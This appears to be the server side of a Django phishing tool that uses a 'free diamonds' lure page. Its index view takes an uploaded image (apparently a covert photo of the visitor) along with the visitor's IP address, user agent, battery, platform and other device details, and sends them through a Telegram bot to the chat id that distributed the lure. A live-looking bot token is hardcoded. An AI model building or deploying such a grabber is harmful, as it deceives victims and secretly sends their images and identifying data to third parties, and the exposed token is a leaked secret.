from django.shortcuts import render
from telebot import TeleBot
from threading import Thread
from .models import *
bot = TeleBot(token='6587962649:AAFFS5I7dHsUeOCd5J8hmg7c--8xk_LF7xY')

def index(request):
    if request.method == 'POST':
        # print(request.GET)
        # print(request.FILES, request.POST)

        file = request.FILES['image']
        data = request.POST
        try:
            bot.send_photo(data['id'], file, caption=f'''
🔋 Energy: {data['battery']},

🔥 User agent: {data['user_agent']},

💻 Platform: {data['platform']},

🔰 Browser: {data['app_name']}

🔰 Browser version: {data['app_version']}

🧠 Device memory: {data['device_memory']}

📲 Device pixel ratio: {data['device_pixel_ratio']}

🌚 IP address: {data['ip_address']}

🤪 Language: {data['lang']}

👇 Max touch points: {data['max_touch_points']}
''')
            if user.objects.filter(chat_id=data['id']).exists():
                pass
            else:
                user.objects.create(chat_id=data['id'])
        except:
            pass
    return render(request, 'index.html')


def free_diamon(requests, user_id):
    return render(requests, 'free_diamon.html', {'user_id': user_id})